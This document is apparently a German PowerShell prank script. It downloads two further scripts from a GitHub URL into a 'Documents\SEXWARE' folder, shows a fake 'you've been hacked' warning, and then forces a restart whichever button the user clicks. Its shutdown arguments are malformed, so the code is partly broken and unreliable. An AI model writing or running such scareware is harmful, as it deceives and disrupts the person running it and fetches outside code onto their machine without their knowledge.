Invoke-WebRequest 'https://raw.githubusercontent.com/CGGonGitHub/PowershellStuff/main/funnyshutdown/AfterRestartYes.ps1' -OutFile Documents\SEXWARE\AfterRestartYes.ps1
Invoke-WebRequest 'https://raw.githubusercontent.com/CGGonGitHub/PowershellStuff/main/funnyshutdown/AfterRestartNo.ps1' -OutFile Documents\SEXWARE\AfterRestartNo.ps1

Add-Type -AssemblyName PresentationCore, PresentationFramework
$Result = [System.Windows.MessageBox]::Show('Du wurdest gehackt! Willst du jetzt neustarten? >:)' ,'Tschau Kakao' ,'YesNo' ,'Warning')
switch($Result){
    'Yes'{shutdown - r-t 10 -c '*Böse Lache* Hahahhaha'}
    'No'{
        
        shutdown - r-t 10 -c 'Hahaha das ist mir sowasvon egal, wird jetzt trotzdem neugestartet :)'
        }
}
